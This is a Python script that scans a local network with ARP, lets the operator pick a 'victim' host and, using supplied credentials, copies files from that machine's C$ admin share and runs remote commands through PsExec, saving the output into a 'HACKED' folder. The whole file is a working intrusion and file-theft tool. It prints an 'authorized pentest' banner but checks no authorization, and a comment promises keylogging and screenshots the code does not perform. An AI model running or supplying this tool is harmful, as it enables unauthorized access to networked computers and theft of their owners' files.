import subprocess
import socket
import ipaddress
import os
from scapy.all import ARP, Ether, srp
import sys

class LANHackerDeploy:
    def __init__(self):
        self.local_ip = self._get_ip()
        self.network = self._get_network()
        self.devices = {}
        self.project_base = "HACKED"
        os.makedirs(self.project_base, exist_ok=True)
    
    def _get_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    
    def _get_network(self):
        return str(ipaddress.IPv4Network(f"{self.local_ip}/24", strict=False))
    
    def scan(self):
        print("🔍 LAN SCAN")
        arp = ARP(pdst=self.network)
        answered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp, timeout=3, verbose=0)[0]
        
        for _, recv in answered:
            self.devices[recv.psrc] = recv.psrc
            print(f"🎯 {recv.psrc}")
    
    def hack_target(self, target_ip, username, password, target_path):
        victim_dir = os.path.join(self.project_base, f"{username}_{target_ip.replace('.','_')}")
        os.makedirs(victim_dir, exist_ok=True)
        
        print(f"\n💥 HACKING {target_ip}")
        print(f"👤 {username}:{password}")
        print(f"📁 {target_path}")
        
        # 1. SMB FILE THEFT
        smb_path = f"\\\\{target_ip}\\C$\\{target_path.replace('C:/', '').replace('/', '\\')}"
        print(f"📥 {smb_path}")
        
        robocopy = f'robocopy "{smb_path}" "{victim_dir}" /E /R:1 /LOG:"{victim_dir}\\files.log"'
        subprocess.run(robocopy, shell=True)
        
        # 2. PSEXEC SHELL
        print("\n⚡ PSEXEC REMOTE SHELL")
        psexec = f'PsExec.exe \\\\{target_ip} -u {username} -p {password} cmd /c "whoami > {victim_dir}\\whoami.txt && dir C:\\Users > {victim_dir}\\users.txt"'
        subprocess.run(psexec, shell=True)
        
        # 3. KEYLOG + SCREENSHOT (if PowerShell allowed)
        powershell = f'PsExec.exe \\\\{target_ip} -u {username} -p {password} powershell -c "Get-Process | Out-File {victim_dir}\\processes.txt"'
        subprocess.run(powershell, shell=True)
        
        print(f"\n✅ DATA DUMPED TO: {victim_dir}")
        print("📋 Files: files.log | whoami.txt | users.txt | processes.txt")
    
    def deploy(self):
        print("🔥 AUTHORIZED PENTEST DEPLOYMENT")
        print(f"🎯 Network: {self.network}")
        
        self.scan()
        
        print("\n🎯 SELECT VICTIM:")
        for i, ip in enumerate(self.devices, 1):
            print(f"{i}. {ip}")
        
        choice = int(input("Target # (1-{}): ".format(len(self.devices)))) - 1
        target_ip = list(self.devices.values())[choice]
        
        username = input("Username: ")
        password = input("Password: ")
        path = input("Path (C:/Users/username/Documents): ")
        
        self.hack_target(target_ip, username, password, path)

if __name__ == "__main__":
    if not os.path.exists("PsExec.exe"):
        print("❌ Download PsExec.exe to this folder!")
        print("👉 https://docs.microsoft.com/en-us/sysinternals/downloads/psexec")
        sys.exit(1)
    
    hacker = LANHackerDeploy()
    hacker.deploy()